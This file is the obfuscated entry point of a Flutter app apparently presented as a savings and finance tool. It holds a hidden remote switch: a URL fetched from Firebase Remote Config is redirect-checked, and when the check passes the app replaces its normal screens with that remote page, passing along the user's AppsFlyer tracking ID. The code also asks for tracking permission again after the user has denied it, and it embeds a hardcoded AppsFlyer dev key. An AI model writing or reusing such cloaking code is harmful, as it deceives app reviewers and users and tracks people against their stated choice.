import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:green_fi/screens/calculator_game_page.dart';
import 'package:green_fi/screens/fxa.dart';
import 'package:green_fi/screens/news_screen.dart';

import 'bloc/cash/cash_bloc.dart';
import 'bloc/nav/nav_bloc.dart';
import 'bloc/saving/saving_bloc.dart';
import 'screens/loading_screen.dart';

late AppsflyerSdk _xcvMnb;
String kjiUyt = '';
String qwePoi = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await zxcAsd();
  await rtyFgh();
  await Firebase.initializeApp(options: Settings.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyAppp());
}

Future<void> zxcAsd() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

Future<void> rtyFgh() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '4rYehnSYQsVcM2jmim5KyC',
      appId: '6739068080',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _xcvMnb = AppsflyerSdk(options);

    await _xcvMnb.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    qwePoi = await _xcvMnb.getAppsFlyerUID() ?? '';

    _xcvMnb.startSDK(
      onSuccess: () {},
      onError: (int code, String message) {},
    );
  } catch (e) {}
}

Future<bool> bnmLkj() async {
  final hjkDsa = FirebaseRemoteConfig.instance;
  await hjkDsa.fetchAndActivate();
  String uioZxc = hjkDsa.getString('calculator');
  String vbnRty = hjkDsa.getString('value');
  if (!uioZxc.contains('null')) {
    final yhnMju = HttpClient();
    final plmKnb = Uri.parse(uioZxc);
    final qazWsx = await yhnMju.getUrl(plmKnb);
    qazWsx.followRedirects = false;
    final response = await qazWsx.close();
    if (response.headers.value(HttpHeaders.locationHeader) != vbnRty) {
      kjiUyt = uioZxc;
      return true;
    } else {
      return false;
    }
  }
  return uioZxc.contains('null') ? false : true;
}

class MyAppp extends StatelessWidget {
  const MyAppp({super.key});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
      future: bnmLkj(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.black,
            child: const CupertinoActivityIndicator(
              color: Colors.white,
              radius: 14,
            ),
          );
        } else {
          if (snapshot.data == true && kjiUyt != '') {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: CalculatorEdit(
                number: kjiUyt,
                value: '$fft$qwePoi',
              ),
            );
          } else {
            return MultiBlocProvider(
              providers: [
                BlocProvider(create: (context) => CashBloc()..add(GetCash())),
                BlocProvider(
                    create: (context) => SavingBloc()..add(GetSaving())),
                BlocProvider(create: (context) => NavBloc()),
              ],
              child: MaterialApp(
                debugShowCheckedModeBanner: false,
                theme: ThemeData(
                  scaffoldBackgroundColor: Colors.black,
                  useMaterial3: false,
                ),
                home: const LoadingScreen(),
              ),
            );
          }
        }
      },
    );
  }
}
